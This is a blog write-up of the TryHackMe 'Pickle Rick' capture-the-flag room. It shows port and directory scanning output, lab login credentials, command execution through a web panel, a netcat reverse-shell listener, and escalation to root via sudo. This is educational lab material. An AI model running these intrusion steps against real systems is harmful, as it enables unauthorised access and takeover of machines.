---
layout: page
title: Pickle Rick
description: Pickle Rick from TryHackMe.
img: 
importance: 4
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/picklerick/logo.jpeg" title="THM Pickle Rick Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/r/room/picklerick">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Welcome here.  We have to find the ingredients to turn Rick back into a human (Three flags).
<br /><br />
The first step is to run nmap to get a list of the open ports.

{% raw %}
```bash
┌──(sec㉿kali)-[~]
└─$ nmap -sV -sC -A -O -oN nmap 10.10.101.216
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 16:18 AEDT
Nmap scan report for 10.10.101.216
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:57:d1:ba:51:42:bc:6c:06:c4:b8:4a:7f:32:90:8a (RSA)
|   256 35:c6:14:4c:6b:92:0c:44:eb:4d:ec:ac:bd:12:0d:03 (ECDSA)
|_  256 fd:6c:21:28:f8:8b:f1:2e:59:df:fd:5e:24:0c:9a:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/5%OT=22%CT=1%CU=37664%PV=Y%DS=4%DC=T%G=Y%TM=677A1
OS:649%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=FC%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=FC%GCD=1%ISR=10C%TI=Z%CI=Z%I
OS:I=I%TS=A)SEQ(SP=FD%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%
OS:O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11
OS:)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W
OS:=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   11.92 ms  10.4.0.1
2   ... 3
4   265.31 ms 10.10.101.216

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.56 seconds
```
{% endraw %}

<br />
Now, notice that port 80 is open.  Navigate to the ip address in the web browser to view the landing page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/picklerick/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Navigate to "view-source:http://10.10.101.216/" to view the source code of the landing page.  Note the username in the comments.

{% raw %}
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/picklerick/sourcelanding.png" title="Landing Page Source" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run ffuf to try and brute-force directories for the web app.

{% raw %}
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.101.216/FUZZ -fs 1602,1062

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.101.216/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 1602,1062
________________________________________________

assets                  [Status: 301, Size: 315, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
:: Progress: [220557/220557] :: Job [1/1] :: 7514 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```
{% endraw %}

<br />
View the robots.txt file and note the string in the file.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/picklerick/robots.png" title="Robots.txt" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run gobuster looking for source files and other functionalities.  Note the login.php page.

{% raw %}
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.101.216 -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.101.216
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 315] [--> http://10.10.101.216/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/server-status        (Status: 403) [Size: 278]
Progress: 661671 / 661674 (100.00%)
===============================================================
Finished
===============================================================
```
{% endraw %}

<br />
Run gobuster looking for interesting text files.

{% raw %}
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.101.216 -x txt,pdf,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.101.216
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf,bak,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://10.10.101.216/assets/]
/robots.txt           (Status: 200) [Size: 17]
/server-status        (Status: 403) [Size: 278]
/clue.txt             (Status: 200) [Size: 54]
Progress: 882228 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```
{% endraw %}

<br />
Check out the clue.txt file to see if it gives us something interesting.

{% raw %}
```
Look around the file system for the other ingredient.
```
{% endraw %}

<br />
Navigate to the login page and give it a look.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/picklerick/login.png" title="The Login Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Login to the page using the username from the landing page comment and the string from the robots.txt.  This will redirect us to a Command Panel.

{% raw %}
```
R1ckRul3s:Wubbalubbadubdub
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/picklerick/cmdpanel.png" title="The Command Panel" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try the whoami just to test the command execution.
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/picklerick/whoami.png" title="Whoami" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Navigate to Revshells to generate a python3 payload.
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/picklerick/revshells.png" title="Whoami" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a netcat listener that is listening on the port that was specified in the revshells payload.

{% raw %}
```bash
root@ip-10-10-34-42:~# nc -nlvp 443
Listening on 0.0.0.0 443
```
{% endraw %}

<br />
Use the payload from revshells and use it in the Command Panel and click the Execute button.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/picklerick/execute.png" title="Execute payload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% raw %}
```bash
root@ip-10-10-34-42:~# nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.101.216 41078
$ 
```
{% endraw %}

<br />
Use python to upgrade the shell.

{% raw %}
```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-10-101-216:/var/www/html$
```
{% endraw %}

<br />
Get the first flag.

{% raw %}
```bash
www-data@ip-10-10-101-216:/var/www/html$ ls
ls
<flagfilename>.txt  clue.txt	 index.html  portal.php
assets			     denied.php  login.php   robots.txt
www-data@ip-10-10-101-216:/var/www/html$ cat <flagfilename>.txt^[[C
cat <flagfilename>.txt
<flag>
```
{% endraw %}

<br />
Get the second flag.

{% raw %}
```bash
www-data@ip-10-10-101-216:/var/www/html$ cd /home/rick
cd /home/rick
www-data@ip-10-10-101-216:/home/rick$ ls
ls
<second flag file>
www-data@ip-10-10-101-216:/home/rick$ cat <second flag file>
cat <second flag file>
<flag>
```
{% endraw %}

<br />
Use the sudo -l to see a list of all the commands the current user can execute as sudo.  Notice that we can run all command no password.

{% raw %}
```bash
www-data@ip-10-10-101-216:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-10-101-216:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-101-216:
    (ALL) NOPASSWD: ALL
```
{% endraw %}

<br />
Use sudo su - to switch the user to the root user.

{% raw %}
```bash
www-data@ip-10-10-101-216:/var/www/html$ sudo su -
sudo su -
```
{% endraw %}

<br />
Get the third flag.

{% raw %}
```bash
root@ip-10-10-101-216:~# ls -la
ls -la
total 36
drwx------  4 root root 4096 Jul 11 10:17 .
drwxr-xr-x 23 root root 4096 Jan  5 05:17 ..
-rw-r--r--  1 root root   29 Feb 10  2019 <third flag file>
-rw-------  1 root root  168 Jul 11 11:18 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwxr-xr-x  4 root root 4096 Jul 11 10:53 snap
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-------  1 root root  702 Jul 11 10:17 .viminfo
root@ip-10-10-101-216:~# <third flag file>
<third flag file>
<flag>
```
{% endraw %}

<br />
Hopefully you enjoyed the read.